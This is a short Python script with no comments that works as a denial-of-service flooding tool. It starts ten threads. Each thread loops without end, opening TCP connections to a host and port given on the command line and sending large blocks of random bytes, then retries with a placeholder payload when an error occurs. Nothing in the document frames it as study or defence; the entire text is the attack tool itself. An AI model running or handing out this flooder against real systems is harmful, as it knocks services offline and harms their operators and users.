import socket
import sys
import random
from threading import Thread
def ok():
  while True:
    try:
      data = random._urandom(65505)
      s = socket.socket()
      s.connect((sys.argv[1], int(sys.argv[2])))
      s.sendall(data)
    except:
      s = socket.socket()
      s.connect((sys.argv[1], int(sys.argv[2])))
      s.sendall(b"SYN, ACK, RST")
      s.close()
for i in range(10):
  t = Thread(target=ok).start()
